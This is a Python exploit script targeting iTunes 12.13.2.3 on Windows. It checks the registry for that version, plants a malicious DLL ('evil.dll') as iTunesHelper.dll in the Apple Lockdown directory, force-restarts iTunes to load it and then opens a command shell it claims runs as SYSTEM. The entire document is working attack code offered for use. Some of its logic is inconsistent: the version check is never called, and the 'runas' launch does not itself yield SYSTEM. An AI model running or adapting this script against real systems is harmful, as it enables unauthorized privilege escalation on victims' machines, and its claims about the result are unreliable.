import os
import shutil
import time
import ctypes
import winreg
import subprocess

def check_itunes_version():
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    vulnerable_version = "12.13.2.3"

    try:
        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key = winreg.OpenKey(reg, reg_path)

        for i in range(0, winreg.QueryInfoKey(key)[0]):
            subkey_name = winreg.EnumKey(key, i)
            subkey = winreg.OpenKey(key, f"{reg_path}\\{subkey_name}")

            try:
                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]

                if "iTunes" in name and version == vulnerable_version:
                    print(f"[+] Vulnerable iTunes version {version} detected!")
                    return True
            except:
                continue
    except Exception as e:
        print(f"[-] Could not check iTunes version: {e}")
    
    print("[-] iTunes is not vulnerable or not installed.")
    return False

def exploit_itunes():
    LOCKDOWN_PATH = r"C:\ProgramData\Apple\Lockdown"
    MALICIOUS_DLL = "evil.dll"

    if not os.path.exists(LOCKDOWN_PATH):
        print("[-] Lockdown directory does not exist, exploit may not work.")
        return False

    print(f"[+] Exploiting iTunes by writing to {LOCKDOWN_PATH}...")
    
    try:
        shutil.copy(MALICIOUS_DLL, os.path.join(LOCKDOWN_PATH, "iTunesHelper.dll"))
        print(f"[+] Malicious DLL placed in {LOCKDOWN_PATH}\\iTunesHelper.dll")
    except Exception as e:
        print(f"[-] Failed to write DLL: {e}")
        return False

    print("[+] Waiting for iTunes to restart (or force restart it)...")
    time.sleep(5)

    # Restart iTunes service to trigger execution of malicious DLL
    os.system("taskkill /F /IM iTunesHelper.exe")
    subprocess.run("start iTunes.exe", shell=True)

    print("[+] If successful, SYSTEM shell should now be available!")
    return True

# Spawn a SYSTEM shell
def spawn_system_shell():
    print("[+] Spawning SYSTEM shell...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", "/k whoami", None, 1)

if __name__ == "__main__":
    print("[*] Checking for vulnerable iTunes version...")
    
    if exploit_itunes():
        spawn_system_shell()
